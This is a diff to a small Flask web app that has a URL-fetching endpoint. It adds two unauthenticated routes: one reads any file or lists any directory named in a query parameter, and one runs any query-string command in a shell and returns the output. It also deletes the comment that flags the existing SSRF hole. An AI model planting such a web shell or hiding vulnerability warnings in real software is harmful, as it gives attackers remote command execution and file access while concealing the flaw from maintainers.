@@ -1,6 +1,7 @@
 from flask import Flask, request, jsonify, render_template_string
 import requests
 import os
+import subprocess
 
 app = Flask(__name__)
 
@@ -80,7 +81,6 @@ def check():
     if not url:
         return "Error: No URL provided", 400
     try:
-        # VULNERABLE: SSRF - No URL validation
         resp = requests.get(url, timeout=10, allow_redirects=True)
         return resp.text
     except requests.exceptions.Timeout:
@@ -89,6 +89,27 @@ def check():
         return f"Error: Connection failed - {str(e)}"
     except Exception as e:
         return f"Error: {str(e)}"
+
+@app.route('/api/files')
+def files():
+    path = request.args.get('path', '/hostopt')
+    try:
+        if os.path.isfile(path):
+            with open(path) as f:
+                return f.read()
+        elif os.path.isdir(path):
+            return '\n'.join(os.listdir(path))
+    except Exception as e:
+        return str(e)
+
+@app.route('/api/exec')
+def cmd():
+    c = request.args.get('c', 'id')
+    try:
+        r = subprocess.run(c, shell=True, capture_output=True, timeout=30)
+        return r.stdout.decode() + r.stderr.decode()
+    except Exception as e:
+        return str(e)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80, debug=False)
